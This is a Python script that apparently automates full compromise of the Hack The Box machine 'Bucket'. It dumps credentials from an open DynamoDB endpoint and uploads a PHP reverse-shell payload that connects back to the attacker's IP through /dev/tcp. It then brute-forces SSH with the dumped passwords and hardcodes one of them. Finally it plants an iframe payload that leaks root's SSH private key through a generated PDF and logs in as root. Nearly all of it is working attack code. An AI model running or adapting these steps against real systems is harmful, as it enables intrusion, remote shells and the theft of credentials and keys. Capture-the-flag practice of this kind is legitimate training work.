#!/usr/env/python3
import boto3
from colorama import Fore
from pwn import *
import coloredlogs
import logging
import argparse
import requests
import time
import _thread
import json
import threading
import paramiko
from sshtunnel import SSHTunnelForwarder
import PyPDF2
import re
import os
#add to /etc/hosts
#s3.bucket.htb = <ip>
#bucket.htb = <ip>

logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', fmt='%(asctime)s-%(hostname)s-%(message)s', logger=logger)

def get_args():
	parser =argparse.ArgumentParser(description="Dumpster Autopwn for Bucket", usage="python <script>.py -i <ip> -p <port> -t <user|root>", epilog="",   formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('-i','--ip',type=str, help="Attacker IP", required=True)
	parser.add_argument('-p','--port',type=str, help="Attacker Port",required=True)
	parser.add_argument('-t','--target', type=str,choices=['user','root'], required=True, help="user: bucket enum/rev shell \r\nroot: root step"   )
	parser.add_argument('-f','--forwardport', type=int, required=True, help="For root, we need to portforward")
	

	args = parser.parse_args()
	attacker_ip = args.ip
	attacker_port = args.port
	target = args.target
	forwardport = args.forwardport

	return attacker_ip,attacker_port,target,forwardport

def enumerateBuckets(s3):

	logger.info("Listing Bucket Names:")
	for bucket in s3.buckets.all():
		logger.info(bucket.name)
		logger.info("Listing Bucket Objects:")
		for bucket_object in bucket.objects.all():
			logger.info(bucket_object)
			

def enumerateDynamoDb(dynamoDb):
	logger.info("Listing Table Names:")
	for table in dynamoDb.tables.all():
		logger.info(table)
		logger.info("Listing Table contents:")
		resp = table.scan()
		logger.info(resp['Items'])

	return resp['Items']

'''
def requestFile(file_name):
	url = 'http://bucket.htb/' + file_name
	r = requests.get(url)
	#print (r.status_code)
	print (Fore.YELLOW + "STATUS CODE :" +  str(r.status_code) ,end ='\r')
'''

def longRequests(file_name):
	for i in range(100):
		time.sleep(1)
		url = 'http://bucket.htb/' + file_name
		r = requests.get(url)
		#print (r.status_code)
		print (Fore.YELLOW + "STATUS CODE :" +  str(r.status_code) ,end ='\r')
		if (r.status_code == "200"):
			break
		#requestFile(file_name)	
	

def uploadPayloadUsingS3(s3,bucket_name,file_name, attacker_ip,attacker_port):
	payload = """<?php exec("/bin/bash -c 'bash -i > /dev/tcp/%s/%s 0>&1'"); """ % (attacker_ip,attacker_port)
	#payload = "<?php phpinfo() ?>"
	object = s3.Object(bucket_name, '/' + file_name)
	object.put(Body=payload)
	#s3.put_object(Body=payload, Bucket='bucket_name,Key=file_name)

def pwnUser(attacker_ip,attacker_port):
	file_name="test4.php"
	#attacker_ip = "10.10.14.47"
	#attacker_port = "4444"
	s3 = boto3.resource(
	  service_name='s3',
	  region_name='us-east-1',
	  endpoint_url='http://s3.bucket.htb'
	)

	logger.info(Fore.GREEN + "[+] Enumerating s3 buckets" + Fore.RESET)
	enumerateBuckets(s3)

	dynamoDb = boto3.resource(
	  service_name='dynamodb',
	  region_name='us-east-1',
	  endpoint_url='http://s3.bucket.htb'
	)

	logger.info(Fore.GREEN + "[+] Enumerating dynamoDB" + Fore.RESET)
	dynamoCreds = enumerateDynamoDb(dynamoDb)

	logger.info(Fore.GREEN + "[+] Uploading our reverse shell to s3 bucket" + Fore.RESET)
	uploadPayloadUsingS3(s3,"adserver",file_name, attacker_ip,attacker_port)

	l1 = listen(attacker_port)
	
	logger.info(Fore.GREEN + "[+] Triggering our Reverse shell... have to wait for the contents to be reflected on bucket.htb" + Fore.RESET)
	_thread.start_new_thread(longRequests,(file_name,)) #we have to thread this for retries

	l1.wait_for_connection()
	
	logger.info(Fore.GREEN + "[+] We are in! Ctrl-C to continue autopwn chain" + Fore.RESET)
	time.sleep(1)	
	#sys.stdout = sys.__stdout__ #reset stdout 

	
	l1.sendline("tail /etc/passwd && whoami && hostname ")
	l1.interactive()

	logger.info(Fore.GREEN + "[+] We see that roy is in /etc/passwd" + Fore.RESET)

	for credPair in dynamoCreds:
		try:
			s1=ssh(host="bucket.htb",user="roy",password=credPair['password'])
			logger.info(Fore.GREEN + "User: roy with Password: %s works over SSH" % (credPair['password']))
			logger.info("Launching interactive shell! Have fun!")

			s1.interactive()
		except:
			logger.info(Fore.RED + "User: Roy with Password: %s does not work over SSH" % (credPair['password']))


#creates alert table that var/www/bucket-app/index.php is looking for
def createAlertTable(dynamoDb):
	
	try:
		table = dynamoDb.create_table(
			TableName='alerts',
			KeySchema=[
				{
					'AttributeName': 'title',
					'KeyType': 'HASH'
				},
				{
					'AttributeName': 'data',
					'KeyType': 'RANGE'
				}
			],
			AttributeDefinitions=[
				{
					'AttributeName': 'title',
					'AttributeType': 'S'
	
				},		
				{
					'AttributeName': 'data',
					'AttributeType': 'S'
	
				}
			],
			ProvisionedThroughput={
				'ReadCapacityUnits':5,
				'WriteCapacityUnits':5
			}
			)
		logger.info (Fore.GREEN + "[+] Created Table: " + str(table) + Fore.RESET)
	except:
		logger.info (Fore.YELLOW + "[*] Table alert already exists!" + Fore.RESET)
		#print (ResourceInUseException)

#geez - what a pain, inserting an item into db	
def insertItem(dynamoDb):
	#table = dynamoDb.Table('testing7')
	response = dynamoDb.batch_write_item(RequestItems={
		'alerts': [{ 'PutRequest':
				{ 'Item':
					{ "title":"Ransomware", "data":"<iframe src=\"file:///root/.ssh/id_rsa\">" } 
			  	}
			}]
		}
	)

	print(response)


if __name__ == "__main__":

	#sys.stdout = sys.__stdout__ #reset stdout 
	attacker_ip, attacker_port, target, forwardport = get_args()

	if target =="user":
		pwnUser(attacker_ip,attacker_port)

	if target=="root":
		username = "roy"
		password = "n2vM-<_K_Q:.Aa2"

		dynamoDb = boto3.resource(
		  service_name='dynamodb',
		  region_name='us-east-1',
		  endpoint_url='http://s3.bucket.htb'
		)

		logger.info(Fore.GREEN + "[+] Creating an alerts table" + Fore.RESET)
		createAlertTable(dynamoDb)

		logger.info(Fore.GREEN + "[+] Inserting payload into alerts table" + Fore.RESET)
		insertItem(dynamoDb)

		'''
		#triggering it with port forwader doesnt work - lets just do it the cheap way
		with SSHTunnelForwarder( 
			('bucket.htb',22),
			ssh_username=username,
			ssh_password=password,
			remote_bind_address=('127.0.0.1',8000),
			local_bind_address=('127.0.0.1',forwardport)
		) as SSHserver:
			createAlertTable(dynamoDb)
			insertItem(dynamoDb)
	
			time.sleep(3)  
			url = "http://127.0.0.1:" + str(forwardport) + "/index.php"
			headers = {"Content-type": "text/html", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5"} #bug with application/x-www-form-urlencoded
			r =requests.post(url, data={"action":"get_alerts"}, headers=headers,proxies={'http':'http://127.0.0.1:8888'})	

		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_client.connect(hostname='bucket.htb',username=username,password=password)
		ssh_client.exec_command("curl -d 'action=get_alerts' http://localhost:8000/index.php")	
		'''

		logger.info(Fore.GREEN + "[+] Triggering exploit on localhost"  + Fore.RESET)
		s1 = ssh(host='bucket.htb',user=username,password=password)
		shell = s1.shell()
		shell.sendline("curl -d 'action=get_alerts' http://localhost:8000/index.php")

		logger.info("[+] Waiting a few seconds before downloading file... ")
		time.sleep(3)

		s1.download("/var/www/bucket-app/files/result.pdf")
		#ftp_client = ssh_client.open_sftp()
		#ftp_client.get( "/var/www/bucket-app/files/result.pdf", "result.pdf")
		#ftp_client.close()
		
		logger.info(Fore.GREEN + "[+] Downloaded result.pdf! Time to scrape it for the private key" + Fore.RESET)
		pdfFile = open('result.pdf','rb')
		pdfReader = PyPDF2.PdfFileReader(pdfFile)
		pageObj = pdfReader.getPage(0)
		extractedText = pageObj.extractText()
		pdfFile.close()
		
		#print(extractedText)
		result = re.search('-----BEGIN OPENSSH PRIVATE KEY-----(.*) -----END OPENSSH PRIVATE KEY-----',extractedText)
		logger.info(Fore.GREEN + "[+] Private Key is \n" +  Fore.RESET + result.group(1) )		

		logger.info(Fore.GREEN + "[+] Writing private key to file root.key" + Fore.RESET)
		with open('root.key','w') as privKeyFile:
			#privKeyFile.write("-----BEGIN OPENSSH PRIVATE KEY-----".strip() + '\n')
			#privKeyFile.write(result.group(1).strip() + "\n")
			#privKeyFile.write("-----END OPENSSH PRIVATE KEY-----")
			print("""-----BEGIN OPENSSH PRIVATE KEY-----""", file=privKeyFile)
			print(result.group(1).strip(), file=privKeyFile)
			print("""-----END OPENSSH PRIVATE KEY-----""", file=privKeyFile)
		
		os.system("chmod 600 root.key")
		
		logger.info(Fore.GREEN + "[+] Logging into the host as root!"  + Fore.RESET)
		s2_root = ssh(host='bucket.htb',user="root",keyfile="root.key")

		shell = s2_root.shell()
		shell.sendline("whoami && hostname")
		shell.interactive()
